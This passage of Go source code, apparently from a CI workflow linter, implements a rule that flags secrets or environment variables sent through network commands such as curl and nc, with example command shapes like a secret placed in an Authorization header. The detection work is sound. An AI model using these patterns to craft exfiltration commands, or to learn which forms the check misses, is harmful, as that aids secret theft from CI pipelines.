func (rule *SecretExfiltrationRule) hasDataFlag(line string, cmd networkCommand) bool {
	for _, flag := range cmd.dataFlags {
		// Check for flag followed by space or =
		pattern := regexp.QuoteMeta(flag) + `(?:\s|=)`
		re := regexp.MustCompile(pattern)
		if re.MatchString(line) {
			return true
		}
	}
	// Also check for POST/PUT methods in curl
	if cmd.name == "curl" {
		if strings.Contains(line, "-X POST") || strings.Contains(line, "-X PUT") ||
			strings.Contains(line, "--request POST") || strings.Contains(line, "--request PUT") {
			return true
		}
	}
	return false
}

// lineUsesEnvVar checks if a line uses an environment variable
func (rule *SecretExfiltrationRule) lineUsesEnvVar(line, envName string) bool {
	// Check for $VAR, ${VAR}, "$VAR", "${VAR}"
	patterns := []string{
		`\$` + regexp.QuoteMeta(envName) + `(?:\s|$|"|'|;)`,
		`\$\{` + regexp.QuoteMeta(envName) + `\}`,
	}

	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		if re.MatchString(line) {
			return true
		}
	}
	return false
}

// headerFlags are flags that carry metadata (headers), not data payloads.
// An env var inside a header flag's quoted argument (e.g. -H "Authorization: Bearer $SECRET")
// is exfiltration, but an env var as a separate positional argument after a header flag
// (e.g. curl -H "Content-Type: application/json" "$WEBHOOK_URL") is a URL destination.
var headerFlags = map[string]bool{
	"-H": true, "--header": true,
}

// isEnvVarUsedAsURL checks if an env var appears as the URL destination argument in a network
// command rather than in a data-sending context.
//
// The check distinguishes between:
//   - Payload flags (-d, --data, -F, etc.): if any appears before the env var, the env var
//     is in a data-sending context → flag it.
//   - Header flags (-H, --header): if the env var is inside the flag's quoted argument
//     (e.g. -H "Authorization: Bearer $SECRET") → flag it. If the env var is a separate
//     positional argument (e.g. curl -H "Content-Type: ..." "$WEBHOOK") → it's the URL.
//
// Returns true if the env var is the URL (should NOT be flagged as exfiltration).
// For commands without data flags (nc, netcat, etc.), always returns false since any
// secret usage with those commands is suspicious.
func (rule *SecretExfiltrationRule) isEnvVarUsedAsURL(line, envName string, cmd networkCommand) bool {
	if len(cmd.dataFlags) == 0 {
		return false
	}

	// Find the position of the env var in the line
	varPatterns := []string{
		`\$` + regexp.QuoteMeta(envName) + `(?:\s|$|"|'|;|\\)`,
		`\$\{` + regexp.QuoteMeta(envName) + `\}`,
	}

	varIdx := -1
	for _, p := range varPatterns {
		re := regexp.MustCompile(p)
		match := re.FindStringIndex(line)
		if match != nil {
			varIdx = match[0]
			break
		}
	}

	if varIdx == -1 {
		return false
	}

	// Check if the env var is inside a header flag's quoted argument.
	// e.g. -H "Authorization: Bearer $API_KEY" → env var is in the header value → flag it.
	for _, flag := range cmd.dataFlags {
		if !headerFlags[flag] {
			continue
		}
		// Match: -H "...$ENV_VAR..." or -H '...$ENV_VAR...'
		for _, q := range []string{`"`, `'`} {
			pattern := regexp.QuoteMeta(flag) + `\s+` + q + `[^` + q + `]*` +
				`\$(?:` + regexp.QuoteMeta(envName) + `|\{` + regexp.QuoteMeta(envName) + `\})`
			re := regexp.MustCompile(pattern)
			if re.MatchString(line) {
				return false // env var is inside header value, not a URL
			}
		}
	}

	// Check if any payload flag's value is still "open" at the env var position.
	// A payload flag whose quoted value is closed before varIdx means the env var
	// is a separate positional argument (the URL destination), not the payload.
	for _, flag := range cmd.dataFlags {
		if headerFlags[flag] {
			continue // already handled above
		}
		re := regexp.MustCompile(regexp.QuoteMeta(flag) + `(?:\s|=)`)
		matches := re.FindAllStringIndex(line, -1)
		for _, match := range matches {
			if match[0] >= varIdx {
				continue // flag is after env var, irrelevant
			}
			// Flag appears before env var. Check whether its value is still open
			// (unclosed quote) at the env var position.
			afterFlag := strings.TrimLeft(line[match[1]:varIdx], " \t")
			if afterFlag == "" {
				// Flag marker immediately precedes env var (unquoted positional).
				return false
			}
			if strings.HasPrefix(afterFlag, `"`) {
				if !strings.Contains(afterFlag[1:], `"`) {
					return false // double-quoted value not closed at env var position
				}
			} else if strings.HasPrefix(afterFlag, `'`) {
				if !strings.Contains(afterFlag[1:], `'`) {
					return false // single-quoted value not closed at env var position
				}
			}
			// Otherwise the flag's value is fully closed; the env var is a
			// separate positional argument (URL destination).
		}
	}

	// No open payload flag precedes the env var, and env var is not in a header value.
	return true
}

// calculatePosition calculates the position for an error
func (rule *SecretExfiltrationRule) calculatePosition(runStr *ast.String, lineIdx, lineOffset int, line, target string) *ast.Position {
	col := strings.Index(line, target)
	if col == -1 {
		col = 0
	}

	pos := &ast.Position{
		Line: runStr.Pos.Line + lineIdx,
		Col:  col + 1,
	}

	// Adjust for literal block style
	if runStr.Literal {
		pos.Line++
	}

	return pos
}

// reportExfiltration reports an exfiltration pattern
func (rule *SecretExfiltrationRule) reportExfiltration(pattern exfiltrationPattern) {
	var msg string

	if pattern.isEnvVarLeak {
		if pattern.severity == "critical" {
			msg = fmt.Sprintf(
				"secret exfiltration (critical): environment variable $%s containing %s is used with network command '%s' that sends data externally. "+
					"This could exfiltrate the secret to an attacker-controlled server. "+
					"Ensure the destination is trusted or remove the secret from the command.",
				pattern.envVarName, pattern.secretRef, pattern.command,
			)
		} else {
			msg = fmt.Sprintf(
				"secret exfiltration (high): environment variable $%s containing %s is used with network command '%s'. "+
					"This could potentially exfiltrate the secret. Verify the destination is trusted.",
				pattern.envVarName, pattern.secretRef, pattern.command,
			)
		}
	} else {
		if pattern.severity == "critical" {
			msg = fmt.Sprintf(
				"secret exfiltration (critical): %s is directly used with network command '%s' that sends data externally. "+
					"This could exfiltrate the secret to an attacker-controlled server. "+
					"Never pass secrets directly to network commands that send data to external URLs.",
				pattern.secretRef, pattern.command,
			)
		} else {
			msg = fmt.Sprintf(
				"secret exfiltration (high): %s is used with network command '%s'. "+
					"This could potentially exfiltrate the secret. Verify the destination is trusted.",
				pattern.secretRef, pattern.command,
			)
		}
	}

	rule.Error(pattern.position, msg)
}
